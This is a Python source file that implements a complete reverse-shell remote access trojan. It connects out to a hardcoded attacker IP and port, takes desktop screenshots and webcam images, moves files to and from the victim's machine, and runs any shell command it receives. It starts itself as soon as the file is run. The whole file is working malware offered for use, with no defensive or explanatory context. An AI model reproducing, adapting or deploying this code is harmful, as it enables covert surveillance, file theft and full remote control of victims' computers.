import socket
import subprocess
import os
import pyautogui
import cv2

def send_file(sock, file_path):
    try:
        file_size = os.path.getsize(file_path)
        sock.sendall(str(file_size).encode() + b'\n')
        
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                sock.sendall(bytes_read)
    except Exception as e:
        sock.sendall(b"ERROR: " + str(e).encode() + b'\n')

def receive_file(sock, file_path):
    try:
        file_size = int(sock.recv(1024).decode().strip())
        
        with open(file_path, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
    except Exception as e:
        sock.sendall(b"ERROR: " + str(e).encode() + b'\n')

def reverse_shell():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.18.10', 8080))  # Replace with your attacker's IP and port

    while True:
        command = sock.recv(1024).decode()
        if command == 'exit':
            break
        elif command == 'desktop':
            img = pyautogui.screenshot()
            img.save('screenshot.jpg', quality=90)  # Save as JPEG with quality 90
            send_file(sock, 'screenshot.jpg')
        elif command == 'camera':
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cv2.imwrite('camera.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])  # Save as JPEG with quality 90
            cap.release()
            send_file(sock, 'camera.jpg')
        elif command.startswith('download'):
            _, file_path = command.split()
            send_file(sock, file_path)
        elif command.startswith('upload'):
            _, file_path = command.split()
            receive_file(sock, file_path)
        elif command.startswith('cd '):
            try:
                directory = command[3:].strip()
                os.chdir(directory)
                sock.sendall(f"Changed directory to {directory}\n".encode())
            except Exception as e:
                sock.sendall(f"ERROR: {e}\n".encode())
        else:
            try:
                output = subprocess.check_output(command, shell=True)
                sock.send(output)
            except subprocess.CalledProcessError as e:
                sock.send(f"ERROR: {e}\n".encode())

    sock.close()

reverse_shell()
